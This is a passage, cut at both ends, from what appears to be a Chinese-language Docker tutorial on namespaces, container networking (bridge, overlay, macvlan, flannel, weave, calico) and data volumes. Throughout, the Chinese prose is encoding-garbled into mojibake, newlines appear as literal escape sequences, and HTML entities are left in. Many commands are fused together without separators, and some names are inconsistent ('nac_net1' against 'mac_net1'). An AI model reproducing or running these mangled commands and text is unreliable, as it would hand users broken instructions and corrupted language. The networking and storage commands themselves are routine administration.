IPCã€PIDã€Networkå’ŒUserã€‚\n\n\nMount namespaceè®©å®¹å™¨çœ‹ä¸Šå»æ‹¥æœ‰æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚\n\n\nUTS namespaceè®©å®¹å™¨æœ‰è‡ªå·±çš„hostnameã€‚\n\n\nIPC namespaceè®©å®¹å™¨æ‹¥æœ‰è‡ªå·±çš„å…±äº«å†…å­˜å’Œä¿¡å·é‡ï¼ˆsemaphoreï¼‰æ¥å®ç°è¿›ç¨‹é—´é€šä¿¡ï¼Œè€Œä¸ä¼šä¸hostå’Œå…¶ä»–å®¹å™¨çš„IPCæ··åœ¨ä¸€èµ·ã€‚\n\n\nPID namespace è®©å®¹å™¨åœ¨hostä¸­ä»¥è¿›ç¨‹çš„å½¢å¼è¿è¡Œã€‚ä¾‹å¦‚å½“å‰hostä¸­è¿è¡Œäº†ä¸¤ä¸ªå®¹å™¨ã€‚é€šè¿‡å®¿ä¸»æœº ps axf å¯ä»¥æŸ¥çœ‹å®¹å™¨è¿›ç¨‹ã€‚æ‰€æœ‰å®¹å™¨çš„è¿›ç¨‹éƒ½æŒ‚åœ¨dockerdè¿›ç¨‹ä¸‹ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥çœ‹åˆ°å®¹å™¨è‡ªå·±çš„å­è¿›ç¨‹ã€‚\n\n\nNetwork namespaceè®©å®¹å™¨æ‹¥æœ‰è‡ªå·±ç‹¬ç«‹çš„ç½‘å¡ã€IPã€è·¯ç”±ç­‰èµ„æºã€‚\n\n\nUser namespaceè®©å®¹å™¨èƒ½å¤Ÿç®¡ç†è‡ªå·±çš„ç”¨æˆ·ï¼Œhostä¸èƒ½çœ‹åˆ°å®¹å™¨ä¸­åˆ›å»ºçš„ç”¨æˆ·ã€‚\n\n\nDockerç½‘ç»œ\nå•ä¸ªhostä¸Šçš„å®¹å™¨ç½‘ç»œ\nnoneç½‘ç»œ\nnoneç½‘ç»œå°±æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰çš„ç½‘ç»œã€‚æŒ‚åœ¨è¿™ä¸ªç½‘ç»œä¸‹çš„å®¹å™¨é™¤äº†loï¼Œæ²¡æœ‰å…¶ä»–ä»»ä½•ç½‘å¡ã€‚\ndocker run -itd --network=none httpd\nhostç½‘ç»œ\nè¿æ¥åˆ°hostç½‘ç»œçš„å®¹å™¨å…±äº«Docker hostçš„ç½‘ç»œæ ˆï¼Œå®¹å™¨çš„ç½‘ç»œé…ç½®ä¸hostå®Œå…¨ä¸€æ ·ã€‚\ndocker run -itd --network=host httpddocker inspect 309d1004f38c&quot;NetworkMode&quot;: &quot;host&quot;\nbridgeç½‘ç»œ\nDockerå®‰è£…æ—¶ä¼šåˆ›å»ºä¸€ä¸ªå‘½åä¸ºdocker0çš„Linux bridgeã€‚å¦‚æœä¸æŒ‡å®šâ€“networkï¼Œåˆ›å»ºçš„å®¹å™¨é»˜è®¤éƒ½ä¼šæŒ‚åˆ°docker0ä¸Šã€‚ brctl showå¯ä»¥çœ‹ç½‘å¡\n\ndocker run -itd httpddocker inspect da9b1b378e0f&quot;NetworkMode&quot;: &quot;default&quot;\nâ€‹\nuser-definedç½‘ç»œ\nç”¨æˆ·ä¹Ÿå¯ä»¥æ ¹æ®ä¸šåŠ¡éœ€è¦åˆ›å»ºuser-definedç½‘ç»œã€‚\ndocker network create --driver bridge my_net 1docker network inspect1 my_net #æŸ¥çœ‹        &quot;IPAM&quot;: &#123;            &quot;Driver&quot;: &quot;default&quot;,            &quot;Options&quot;: &#123;&#125;,            &quot;Config&quot;: [                &#123;                    &quot;Subnet&quot;: &quot;172.18.0.0/16&quot;,                    &quot;Gateway&quot;: &quot;172.18.0.1&quot;                &#125;            ]        &#125;,docker run -itd --network=my_net1 httpd#è®¾ç½®ç½‘ç»œ--subnet 172.22.16.0/24--gateway 172.22.16.1 #ä½¿ç”¨ --ip æŒ‡å®šIP åªæœ‰ä½¿ç”¨ --subnetåˆ›å»ºçš„ç½‘ç»œæ‰èƒ½æŒ‡å®šé™æ€IPã€‚docker network create --driver bridge my_net2 --subnet 172.22.16.0/24 --gateway 172.22.16.1 docker run -itd --network=my_net2 --ip 172.22.16.8 busybox\nä¸åŒçš„ç½‘å¡ host çš„ iptables é»˜è®¤DROP æ— æ³•è¿é€šã€‚å¦‚æœéœ€è¦è¿é€šï¼Œåˆ™éœ€æ·»åŠ ç›®æ ‡ç½‘ç»œç½‘å¡\ndocker network connect my_net2 httpdå®¹å™¨ID\nå®¹å™¨é—´é€šä¿¡\nå®¹å™¨ä¹‹é—´å¯é€šè¿‡IP, Docker DNS Server æˆ– joined å®¹å™¨ä¸‰ç§æ–¹å¼é€šä¿¡ã€‚ä¸¤ä¸ªå®¹å™¨è¦èƒ½é€šä¿¡ï¼Œå¿…é¡»è¦æœ‰å±äºåŒä¸€ä¸ªç½‘ç»œçš„ç½‘å¡ã€‚\n\n\nIP\nå…·ä½“åšæ³•æ˜¯åœ¨å®¹å™¨åˆ›å»ºæ—¶é€šè¿‡ --networkæŒ‡å®šç›¸åº”çš„ç½‘ç»œï¼Œæˆ–è€…é€šè¿‡docker network connectå°†ç°æœ‰å®¹å™¨åŠ å…¥åˆ°æŒ‡å®šç½‘ç»œã€‚\n\n\nDocker DNS Server\ndocker daemonå®ç°äº†ä¸€ä¸ªå†…åµŒçš„DNS serverï¼Œä½¿å®¹å™¨å¯ä»¥ç›´æ¥é€šè¿‡&quot;å®¹å™¨å&quot;é€šä¿¡ã€‚æ–¹æ³•å¾ˆç®€å•ï¼Œåªè¦åœ¨å¯åŠ¨æ—¶ç”¨ --nameä¸ºå®¹å™¨å‘½åå°±å¯ä»¥äº†ã€‚\n\n\njoinedå®¹å™¨\njoinedå®¹å™¨éå¸¸ç‰¹åˆ«ï¼Œå®ƒå¯ä»¥ä½¿ä¸¤ä¸ªæˆ–å¤šä¸ªå®¹å™¨å…±äº«ä¸€ä¸ªç½‘ç»œæ ˆï¼Œå…±äº«ç½‘å¡å’Œé…ç½®ä¿¡æ¯ï¼Œjoinedå®¹å™¨ä¹‹é—´å¯ä»¥é€šè¿‡127.0.0.1ç›´æ¥é€šä¿¡ã€‚\ndocker run -d -it --name=web1 httpddocker run -it --network=container:web1 busybox#ä¸¤ä¸ªå®¹å™¨ä½¿ç”¨ç›¸åŒçš„ç½‘å¡\n\n\nå°†å®¹å™¨ä¸å¤–éƒ¨ä¸–ç•Œè¿æ¥\né€šè¿‡NAT, dockerå®ç°äº†å®¹å™¨å¯¹å¤–ç½‘çš„è®¿é—®ã€‚\nâ€‹\nï¼ˆ1ï¼‰busyboxå‘é€pingåŒ…ï¼š172.17.0.2 &gt; www.bing.comã€‚\nï¼ˆ2ï¼‰docker0æ”¶åˆ°åŒ…ï¼Œå‘ç°æ˜¯å‘é€åˆ°å¤–ç½‘çš„ï¼Œäº¤ç»™NATå¤„ç†ã€‚\nï¼ˆ3ï¼‰NATå°†æºåœ°å€æ¢æˆenp0s3çš„IP:10.0.2.15 &gt; www.bing.comã€‚\nï¼ˆ4ï¼‰pingåŒ…ä»enp0s3å‘é€å‡ºå»ï¼Œåˆ°è¾¾www.bing.comã€‚\nå¤–éƒ¨ä¸–ç•Œè®¿é—®å®¹å™¨\ndockerå¯å°†å®¹å™¨å¯¹å¤–æä¾›æœåŠ¡çš„ç«¯å£æ˜ å°„åˆ°hostçš„æŸä¸ªç«¯å£ï¼Œå¤–ç½‘é€šè¿‡è¯¥ç«¯å£è®¿é—®å®¹å™¨ã€‚å®¹å™¨å¯åŠ¨æ—¶é€šè¿‡-på‚æ•°æ˜ å°„ç«¯å£ã€‚\ndocker run -d -p [host port]:[container port] httpd docker run -d -p 8080:80 httpd \næ¯ä¸€ä¸ªæ˜ å°„çš„ç«¯å£ï¼Œhostéƒ½ä¼šå¯åŠ¨ä¸€ä¸ªdocker-proxyè¿›ç¨‹æ¥å¤„ç†è®¿é—®å®¹å™¨çš„æµé‡ã€‚\nâ€‹\nï¼ˆ1ï¼‰docker-proxyç›‘å¬hostçš„32773ç«¯å£ã€‚\nï¼ˆ2ï¼‰å½“curlè®¿é—®10.0.2.15:32773æ—¶ï¼Œdocker-proxyè½¬å‘ç»™å®¹å™¨172.17.0.2:80ã€‚\nï¼ˆ3ï¼‰httpdå®¹å™¨å“åº”è¯·æ±‚å¹¶è¿”å›ç»“æœã€‚\nâ€\nè·¨å¤šä¸ªhostçš„ç½‘ç»œ\nè·¨ä¸»æœºç½‘ç»œæ–¹æ¡ˆï¼šdockeråŸç”Ÿçš„overlayå’Œmacvlan; ç¬¬ä¸‰æ–¹æ–¹æ¡ˆï¼šå¸¸ç”¨çš„åŒ…æ‹¬flannelã€weaveå’Œcalicoã€‚è¿™äº›æ–¹æ¡ˆä¸dockeré›†æˆæ˜¯é€šè¿‡libnetworkã€container network modelâ€‹\nlibnetwork &amp; CNM\nlibnetworkæ˜¯dockerå®¹å™¨ç½‘ç»œåº“ï¼Œæœ€æ ¸å¿ƒçš„å†…å®¹æ˜¯å…¶å®šä¹‰çš„Container Network Modelï¼ˆCNMï¼‰\n\nSandboxï¼ˆç±»ä¼¼å­˜å‚¨interfaceã€è·¯ç”±è¡¨å’ŒDNSè®¾ç½®çš„è¡¨ï¼‰ï¼šSandboxæ˜¯å®¹å™¨çš„ç½‘ç»œæ ˆï¼ŒåŒ…å«å®¹å™¨çš„interfaceã€è·¯ç”±è¡¨å’ŒDNSè®¾ç½®ã€‚LinuxNetwork Namespaceæ˜¯Sandboxçš„æ ‡å‡†å®ç°ã€‚Sandboxå¯ä»¥åŒ…å«æ¥è‡ªä¸åŒNetworkçš„Endpointã€‚\nEndpointï¼ˆç±»ä¼¼ç½‘å¡ï¼‰ï¼šEndpointçš„ä½œç”¨æ˜¯å°†Sandboxæ¥å…¥Networkã€‚Endpointçš„å…¸å‹å®ç°æ˜¯veth pairï¼Œä¸€ä¸ªEndpointåªèƒ½å±äºä¸€ä¸ªç½‘ç»œï¼Œä¹Ÿåªèƒ½å±äºä¸€ä¸ªSandboxã€‚\nNetworkï¼ˆç±»ä¼¼äº¤æ¢æœºï¼‰ï¼šNetworkåŒ…å«ä¸€ç»„Endpointï¼ŒåŒä¸€Networkçš„Endpointå¯ä»¥ç›´æ¥é€šä¿¡ã€‚Networkçš„å®ç°å¯ä»¥æ˜¯Linux Bridgeã€VLANç­‰ã€‚\n\nlibnetwork CNMå®šä¹‰äº†dockerå®¹å™¨çš„ç½‘ç»œæ¨¡å‹ï¼ŒæŒ‰ç…§è¯¥æ¨¡å‹å¼€å‘å‡ºçš„driverå°±èƒ½ä¸docker daemonååŒå·¥ä½œï¼Œå®ç°å®¹å™¨ç½‘ç»œã€‚\nâ€‹\noverlay\nå®¹å™¨è·¨ä¸»æœºé€šä¿¡ï¼ŒDockeræä¾›äº†overlay driverï¼Œä½¿ç”¨æˆ·å¯ä»¥åˆ›å»ºåŸºäºVxLANçš„overlayç½‘ç»œã€‚VxLANå¯å°†äºŒå±‚æ•°æ®å°è£…åˆ°UDPè¿›è¡Œä¼ è¾“ï¼ŒVxLANæä¾›ä¸VLANç›¸åŒçš„ä»¥å¤ªç½‘äºŒå±‚æœåŠ¡ï¼Œä½†æ˜¯æ‹¥æœ‰æ›´å¼ºçš„æ‰©å±•æ€§å’Œçµæ´»æ€§ã€‚(å°±æ˜¯æ–°å»ºäº†æ¡¥æ¥ç½‘å¡ï¼Œå®¹å™¨å¯æ·»åŠ å˜ä¸ºåŒç½‘å¡)\n#åˆ›å»º docker network create   -d æŒ‡å®šç½‘ç»œdriverdocker network create -d overlay ov_net1 \nmacvlan\nmacvlanæœ¬èº«æ˜¯linux kernelæ¨¡å—ï¼Œå…¶åŠŸèƒ½æ˜¯å…è®¸åŒä¸€ä¸ªç‰©ç†ç½‘å¡é…ç½®å¤šä¸ªMACåœ°å€ï¼Œå³å¤šä¸ªinterfaceï¼Œæ¯ä¸ªinterfaceå¯ä»¥é…ç½®è‡ªå·±çš„IPã€‚macvlanæœ¬è´¨ä¸Šæ˜¯ä¸€ç§ç½‘å¡è™šæ‹ŸåŒ–æŠ€æœ¯\ndocker network create -d macvlan --subnet=172.16.86.0/24 \\--gateway=172.16.86.1 -o parent=eth1 mac_net1-o parentæŒ‡å®šä½¿ç”¨çš„ç½‘ç»œinterfaceã€‚\n\ndockeræ²¡æœ‰ä¸ºmacvlanæä¾›DNSæœåŠ¡ï¼Œè¿™ç‚¹ä¸overlayç½‘ç»œæ˜¯ä¸åŒçš„ã€‚æ— æ³•ping bbox1ï¼Œåªèƒ½é€šè¿‡IPã€‚\nmacvlanç½‘ç»œæ˜¯localç½‘ç»œï¼Œä¸ºäº†ä¿è¯è·¨ä¸»æœºèƒ½å¤Ÿé€šä¿¡ï¼Œç”¨æˆ·ä¸€èˆ¬éœ€è¦è‡ªå·±ç®¡ç†IP subnetã€‚\ndockerä¸ä¼šä¸ºmacvlanåˆ›å»ºç½‘å…³ï¼Œè¿™é‡Œçš„ç½‘å…³åº”è¯¥æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¦åˆ™å®¹å™¨æ— æ³•è·¯ç”±ã€‚\n\ndocker run -itd --name bbox1 --ip=172.16.86.10 --network nac_net1 busyboxdocker run -itd --name bbox2 --ip=172.16.86.11 --network nac_net1 busybox\nmacvlanä¸ä¾èµ–Linux bridge, brctl showå¯ä»¥ç¡®è®¤å¹¶æ²¡æœ‰åˆ›å»ºæ–°çš„bridge\nâ€‹\nç”¨sub-interfaceå®ç°å¤šmacvlanç½‘ç»œ\nmacvlanä¼šç‹¬å ä¸»æœºçš„ç½‘å¡ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªç½‘å¡åªèƒ½åˆ›å»ºä¸€ä¸ªmacvlanç½‘ç»œã€‚macvlanä¸ä»…å¯ä»¥è¿æ¥åˆ°interfaceï¼ˆå¦‚enp0s9ï¼‰ï¼Œä¹Ÿå¯ä»¥è¿æ¥åˆ°sub-interfaceï¼ˆå¦‚VLAN enp0s9.xxxï¼‰ã€‚\nä¸åŒmacvlanç½‘ç»œä¹‹é—´ä¸èƒ½é€šä¿¡ã€‚ä½†å‡†ç¡®çš„è¯´æ³•åº”è¯¥æ˜¯ï¼šä¸åŒmacvlanç½‘ç»œä¸èƒ½åœ¨äºŒå±‚ä¸Šé€šä¿¡ã€‚åœ¨ä¸‰å±‚ä¸Šå¯ä»¥é€šè¿‡ç½‘å…³å°†macvlanè¿é€šã€‚å¯ä»¥å€ŸåŠ©ä¸­é—´ç½‘å…³è¿é€šã€‚å¯ä»¥æ˜¯ç‰©ç†è·¯ç”±ï¼Œå¯ä»¥æ˜¯æŸå°ä¸»æœºé…ç½®çš„sub-interfaceç½‘å…³IPã€‚å¼€å¯ip forwardï¼Œä»¥åŠiptablesæ¥å……å½“è™šæ‹Ÿè·¯ç”±å™¨ã€‚\nå¦‚å°†Host 192.168.56.101é…ç½®æˆä¸€ä¸ªè™šæ‹Ÿè·¯ç”±å™¨ï¼Œè®¾ç½®ç½‘å…³å¹¶è½¬å‘VLAN10å’ŒVLAN20çš„æµé‡ã€‚\nÂ·Â·Â·\n//ip forwardå¼€å¯sysctl -w net.ipv4.ip_forward=1//åœ¨ /etc/network/interfacesä¸­é…ç½®vlan sub-interfaceauto eth2 iface eth2 inet manualauto eth2.10 iface eth2.10 inet manual vlan-raw-device eth2auto eth2.20 iface eth2.20 inet manual vlan-raw-device eth2å¯ç”¨sub-interfaceï¼šifup eth2.10 ifup eth2.20//å°†ç½‘å…³IPé…ç½®åˆ°sub-interfaceï¼šifconfig eth2.10 172.16.10.1 netmask 255.255.255.0 up ifconfig eth2.20 172.16.20.1 netmask 255.255.255.0 up//æ·»åŠ iptablesè§„åˆ™ï¼Œè½¬å‘ä¸åŒVLANçš„æ•°æ®åŒ…ã€‚iptables -t nat -A POSTROUTING -o eth2.10 -j MASQUERADEiptables -t nat -A POSTROUTING -o eth2.20 -j MASQUERADEiptables -A FORWARD -i eth2.10-o eth2.20 -m state --state RELATED, ESTABLISHED -j ACCEPT iptables -A FORWARD -i eth2.20-o eth2.10 -m state --state RELATED, ESTABLISHED -j ACCEPTiptables -A FORWARD -i eth2.10-o eth2.20 -j ACCEPT iptables -A FORWARD -i eth2.20-o eth2.10 -j ACCEPT\nç¬¬ä¸‰æ–¹éœ€è¦ç‰¹åˆ«æ­å»ºï¼Œæ–‡ç« ç¯‡å¹…ä¸æ‹“å±•äº†\nflannel\nflannelæ˜¯CoreOSå¼€å‘çš„å®¹å™¨ç½‘ç»œè§£å†³æ–¹æ¡ˆã€‚flannelä¸ºæ¯ä¸ªhoståˆ†é…ä¸€ä¸ªsubnetï¼Œå®¹å™¨ä»æ­¤subnetä¸­åˆ†é…IPï¼Œè¿™äº›IPå¯ä»¥åœ¨hosté—´è·¯ç”±ï¼Œå®¹å™¨é—´æ— é¡»NATå’Œportmappingå°±å¯ä»¥è·¨ä¸»æœºé€šä¿¡ã€‚åŒæ—¶æ²¡æœ‰éš”ç¦»èƒ½åŠ›ã€‚\næ¯ä¸ªsubnetéƒ½æ˜¯ä»ä¸€ä¸ªæ›´å¤§çš„IPæ± ä¸­åˆ’åˆ†çš„ï¼Œflannelä¼šåœ¨æ¯ä¸ªä¸»æœºä¸Šè¿è¡Œä¸€ä¸ªå«flanneldçš„agentï¼Œå…¶èŒè´£å°±æ˜¯ä»æ± å­ä¸­åˆ†é…subnetã€‚ä¸ºäº†åœ¨å„ä¸ªä¸»æœºé—´å…±äº«ä¿¡æ¯ï¼Œflannelç”¨etcdï¼ˆä¸consulç±»ä¼¼çš„key-valueåˆ†å¸ƒå¼æ•°æ®åº“ï¼‰å­˜æ”¾ç½‘ç»œé…ç½®ã€å·²åˆ†é…çš„subnetã€hostçš„IPç­‰ä¿¡æ¯ã€‚\nâ€\nweave\nweaveæ˜¯Weaveworkså¼€å‘çš„å®¹å™¨ç½‘ç»œè§£å†³æ–¹æ¡ˆã€‚weaveåˆ›å»ºçš„è™šæ‹Ÿç½‘ç»œå¯ä»¥å°†éƒ¨ç½²åœ¨å¤šä¸ªä¸»æœºä¸Šçš„å®¹å™¨è¿æ¥èµ·æ¥ã€‚å¯¹å®¹å™¨æ¥è¯´ï¼Œweaveå°±åƒä¸€ä¸ªå·¨å¤§çš„ä»¥å¤ªç½‘äº¤æ¢æœºï¼Œæ‰€æœ‰å®¹å™¨éƒ½è¢«æ¥å…¥è¿™ä¸ªäº¤æ¢æœºï¼Œå®¹å™¨å¯ä»¥ç›´æ¥é€šä¿¡ï¼Œæ— é¡»NATå’Œç«¯å£æ˜ å°„ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œweaveçš„DNSæ¨¡å—ä½¿å®¹å™¨å¯ä»¥é€šè¿‡hostnameè®¿é—®ã€‚weaveä¸ä¾èµ–åˆ†å¸ƒå¼æ•°æ®åº“ï¼ˆä¾‹å¦‚etcdå’Œconsulï¼‰äº¤æ¢ç½‘ç»œä¿¡æ¯ï¼Œæ¯ä¸ªä¸»æœºä¸Šåªéœ€è¿è¡Œweaveç»„ä»¶å°±èƒ½å»ºç«‹èµ·è·¨ä¸»æœºå®¹å™¨ç½‘ç»œã€‚\né»˜è®¤é…ç½®ä¸‹ï¼Œweaveä½¿ç”¨ä¸€ä¸ªå¤§subnetï¼ˆä¾‹å¦‚10.32.0.0/12ï¼‰ï¼Œæ‰€æœ‰ä¸»æœºçš„å®¹å™¨éƒ½ä»è¿™ä¸ªåœ°å€ç©ºé—´ä¸­åˆ†é…IPï¼Œå› ä¸ºåŒå±ä¸€ä¸ªsubnetï¼Œå®¹å™¨å¯ä»¥ç›´æ¥é€šä¿¡ã€‚å¦‚æœè¦å®ç°ç½‘ç»œéš”ç¦»ï¼Œå¯ä»¥é€šè¿‡ç¯å¢ƒå˜é‡WEAVE_CIDRä¸ºå®¹å™¨åˆ†é…ä¸åŒsubnetçš„IPã€‚\nweaveæ˜¯ä¸€ä¸ªç§æœ‰çš„VxLANç½‘ç»œï¼Œé»˜è®¤ä¸å¤–éƒ¨ç½‘ç»œéš”ç¦»ã€‚è¿é€šéœ€è¦ï¼ˆ1ï¼‰é¦–å…ˆå°†ä¸»æœºåŠ å…¥åˆ°weaveç½‘ç»œã€‚ï¼ˆ2ï¼‰ç„¶åæŠŠä¸»æœºå½“ä½œè®¿é—®weaveç½‘ç»œçš„ç½‘å…³ã€‚\nâ€\ncalico\nCalicoæ˜¯ä¸€ä¸ªçº¯ä¸‰å±‚çš„è™šæ‹Ÿç½‘ç»œæ–¹æ¡ˆï¼ŒCalicoä¸ºæ¯ä¸ªå®¹å™¨åˆ†é…ä¸€ä¸ªIPï¼Œæ¯ä¸ªhostéƒ½æ˜¯routerï¼ŒæŠŠä¸åŒhostçš„å®¹å™¨è¿æ¥èµ·æ¥ã€‚ä¸VxLANä¸åŒçš„æ˜¯ï¼ŒCalicoä¸å¯¹æ•°æ®åŒ…åšé¢å¤–å°è£…ï¼Œä¸éœ€è¦NATå’Œç«¯å£æ˜ å°„ï¼Œæ‰©å±•æ€§å’Œæ€§èƒ½éƒ½å¾ˆå¥½ã€‚Calicoä¾èµ–etcdåœ¨ä¸åŒä¸»æœºé—´å…±äº«å’Œäº¤æ¢ä¿¡æ¯ï¼Œå­˜å‚¨Calicoç½‘ç»œçŠ¶æ€ã€‚host192.168.56.101è´Ÿè´£è¿è¡Œetcdã€‚Calicoç½‘ç»œä¸­çš„æ¯ä¸ªä¸»æœºéƒ½éœ€è¦è¿è¡ŒCalicoç»„ä»¶ï¼Œå®ç°å®¹å™¨interfaceç®¡ç†ã€åŠ¨æ€è·¯ç”±ã€åŠ¨æ€ACLã€æŠ¥å‘ŠçŠ¶æ€ç­‰ã€‚\nä¸åŒçš„calicoç½‘ç»œï¼Œé»˜è®¤ä¸èƒ½é€šè¡Œã€‚calicoé»˜è®¤çš„policyè§„åˆ™æ˜¯ï¼šå®¹å™¨åªèƒ½ä¸åŒä¸€ä¸ªcalicoç½‘ç»œä¸­çš„å®¹å™¨é€šä¿¡ã€‚\nâ€\nDockerå­˜å‚¨\nDockerä¸ºå®¹å™¨æä¾›äº†ä¸¤ç§å­˜æ”¾æ•°æ®çš„èµ„æºï¼šç”±storage driverç®¡ç†çš„é•œåƒå±‚å’Œå®¹å™¨å±‚å’ŒData Volumeâ€‹\nStorage driver\nstorage driverå®ç°äº†å¤šå±‚æ•°æ®çš„å †å å¹¶ä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªå•ä¸€çš„åˆå¹¶ä¹‹åçš„ç»Ÿä¸€è§†å›¾ã€‚Dockeræ”¯æŒå¤šç§storage driverï¼Œæœ‰AUFSã€Device Mapperã€Btrfsã€OverlayFSã€VFSå’ŒZFSã€‚\nä¼˜å…ˆä½¿ç”¨Linuxå‘è¡Œç‰ˆé»˜è®¤çš„storage driverã€‚\nUbuntué»˜è®¤driverç”¨çš„æ˜¯AUFSï¼Œåº•å±‚æ–‡ä»¶ç³»ç»Ÿæ˜¯extfs\nRedhat/CentOSçš„é»˜è®¤driveræ˜¯Device Mapper, SUSEåˆ™æ˜¯Btrfs\nå®¹å™¨æ²¡æœ‰éœ€è¦æŒä¹…åŒ–çš„æ•°æ®ï¼Œéšæ—¶å¯ä»¥ä»é•œåƒç›´æ¥åˆ›å»ºã€‚ä½¿ç”¨storage driverå³å¯ã€‚\nData Volume\nData Volumeæœ¬è´¨ä¸Šæ˜¯Docker Hostæ–‡ä»¶ç³»ç»Ÿä¸­çš„ç›®å½•æˆ–æ–‡ä»¶ï¼Œèƒ½å¤Ÿç›´æ¥è¢«mountåˆ°å®¹å™¨çš„æ–‡ä»¶ç³»ç»Ÿä¸­ã€‚\nï¼ˆ1ï¼‰Data Volumeæ˜¯ç›®å½•æˆ–æ–‡ä»¶ï¼Œè€Œéæ²¡æœ‰æ ¼å¼åŒ–çš„ç£ç›˜ï¼ˆå—è®¾å¤‡ï¼‰ã€‚\nï¼ˆ2ï¼‰å®¹å™¨å¯ä»¥è¯»å†™volumeä¸­çš„æ•°æ®ã€‚\nï¼ˆ3ï¼‰volumeæ•°æ®å¯ä»¥è¢«æ°¸ä¹…åœ°ä¿å­˜ï¼Œä½¿ç”¨å®ƒçš„å®¹å™¨é”€æ¯ä¸å½±å“å®ƒã€‚\nåœ¨å…·ä½“çš„ä½¿ç”¨ä¸Šï¼Œdockeræä¾›äº†ä¸¤ç§ç±»å‹çš„volume:bind mountå’Œdocker managed volumeâ€‹\nbind mount\nbind mountæ˜¯å°†hostä¸Šå·²å­˜åœ¨çš„ç›®å½•æˆ–æ–‡ä»¶mountåˆ°å®¹å™¨ã€‚å³ä½¿å®¹å™¨æ²¡æœ‰äº†ï¼Œbind mountä¹Ÿè¿˜åœ¨ã€‚bind mountæ—¶è¿˜å¯ä»¥æŒ‡å®šæ•°æ®çš„è¯»å†™æƒé™ï¼Œé»˜è®¤æ˜¯å¯è¯»å¯å†™ï¼Œå¯æŒ‡å®šä¸ºåªè¯»\n-vçš„æ ¼å¼ä¸º &lt;host path&gt;:&lt;container path&gt;docker run -d -p 80:80 -v ~/htdocs:/usr/local/apache2/htdocs httpdro=Read-only åªæœ‰hostæœ‰æƒä¿®æ”¹æ•°æ®ï¼Œæé«˜äº†å®‰å…¨æ€§ã€‚docker run -d -p 80:80 -v ~/htdocs:/usr/local/apache2/htdocs:ro httpd\ndocker managed volume\ndocker managed volumeä¸bind mountåœ¨ä½¿ç”¨ä¸Šçš„æœ€å¤§åŒºåˆ«æ˜¯ä¸éœ€è¦æŒ‡å®šmountæºï¼Œéšæœºåœ¨hostç”Ÿæˆã€‚docker inspect å®¹å™¨é•¿ID æŸ¥çœ‹å­˜å‚¨æºä½ç½®ã€‚\ndocker run -d -p 80:80 -v /usr/local/apache2/htdocs httpd\næ•°æ®å…±äº«\nå®¹å™¨ä¸hostå…±äº«æ•°æ®\nå¯¹äºbind mountæ˜¯éå¸¸æ˜ç¡®çš„ï¼šç›´æ¥å°†è¦å…±äº«çš„ç›®å½•mountåˆ°å®¹å™¨ã€‚\ndocker managed volumeå°±è¦éº»çƒ¦ç‚¹ã€‚ç”±äºvolumeä½äºhostä¸­çš„ç›®å½•ï¼Œæ˜¯åœ¨å®¹å™¨å¯åŠ¨æ—¶æ‰ç”Ÿæˆï¼Œæ‰€ä»¥éœ€è¦å°†å…±äº«æ•°æ®å¤åˆ¶åˆ°volumeä¸­ã€‚\ndocker run -d -p 80:80 -v /usr/local/apache2/htdocs httpddocker cp ~/htdocs/index.html å®¹å™¨ID:/usr/local/apache2/htdocs\nå®¹å™¨ä¹‹é—´å…±äº«æ•°æ®\nå°†å…±äº«æ•°æ®æ”¾åœ¨bind mountä¸­ï¼Œç„¶åå°†å…¶mountåˆ°å¤šä¸ªå®¹å™¨ã€‚\ndocker run --name web1 -d -p 80 -v ~/htdocs:/usr/local/apache2/htdocs httpddocker run --name web2 -d -p 80 -v ~/htdocs:/usr/local/apache2/htdocs httpd\nå¦ä¸€ç§åœ¨å®¹å™¨ä¹‹é—´å…±äº«æ•°æ®çš„æ–¹å¼æ˜¯ä½¿ç”¨volume containerã€‚volume containeræ˜¯ä¸“é—¨ä¸ºå…¶ä»–å®¹å™¨æä¾›volumeçš„å®¹å™¨ã€‚å®ƒæä¾›çš„å·å¯ä»¥æ˜¯bind mountï¼Œä¹Ÿå¯ä»¥æ˜¯docker managed volumeã€‚\ndocker create vc_data \\-v ~/htdocs:/usr/local/apache2/htdocs \\-v /other/useful/tools httpddocker run --name web1 -d -p 80 -v ~/htdocs:/usr/local/apache2/htdocs httpd\nå®¹å™¨å‘½åä¸ºvc_dataï¼Œdocker createå‘½ä»¤ï¼Œè¿™æ˜¯å› ä¸ºvolume containerçš„ä½œç”¨åªæ˜¯æä¾›æ•°æ®ï¼Œå®ƒæœ¬èº«ä¸éœ€è¦å¤„äºè¿è¡ŒçŠ¶æ€ã€‚\n\n\nbind mountï¼Œå­˜æ”¾Web Serverçš„é™æ€æ–‡ä»¶ã€‚\n\n\ndocker managed volumeï¼Œå­˜æ”¾ä¸€äº›å®ç”¨å·¥å…·\n\n\nå…¶ä»–å®¹å™¨å¯ä»¥é€šè¿‡--volumes-fromä½¿ç”¨vc_dataè¿™ä¸ªvolume container\n\n\ndocker run --name web1 -d -p 80 --volumes-from vc_data httpddocker run --name web2 -d -p 80 --volumes-from vc_data httpd\ndata-packed volume container å°†æ•°æ®å®Œå…¨æ”¾åˆ°volume containerä¸­ï¼ŒåŒæ—¶åˆèƒ½ä¸å…¶ä»–å®¹å™¨å…±äº«ã€‚åŸç†æ˜¯å°†æ•°æ®æ‰“åŒ…åˆ°é•œåƒä¸­ï¼Œç„¶åé€šè¿‡docker managed volumeå…±äº«ã€‚\nFROM busybox:latestADD htdocs /usr/local/apache2/htdocsVOLUME /usr/local/apache2/htdocs//buildæ–°é•œåƒdatapackeddocker build -t datapacked .ADDå°†é™æ€æ–‡ä»¶æ·»åŠ åˆ°å®¹å™¨ç›®å½• /usr/local/apache2/htdocsã€‚VOLUMEçš„ä½œç”¨ä¸ -v ç­‰æ•ˆï¼Œç”¨æ¥åˆ›å»ºdocker managed volume,mount point ä¸º/usr/local/apache2/htdocså› ä¸ºè¿™ä¸ªç›®å½•å°±æ˜¯ADDæ·»åŠ çš„ç›®å½•ï¼Œæ‰€ä»¥ä¼šå°†å·²æœ‰æ•°æ®å¤åˆ¶åˆ°volumeä¸­ã€‚//buildæ–°é•œåƒdatapackeddocker create --name vc_data datapacked\nå› ä¸ºåœ¨Dockerfileä¸­å·²ç»ä½¿ç”¨äº†VOLUMEæŒ‡ä»¤ï¼Œè¿™é‡Œå°±ä¸éœ€è¦æŒ‡å®švolumeçš„mount 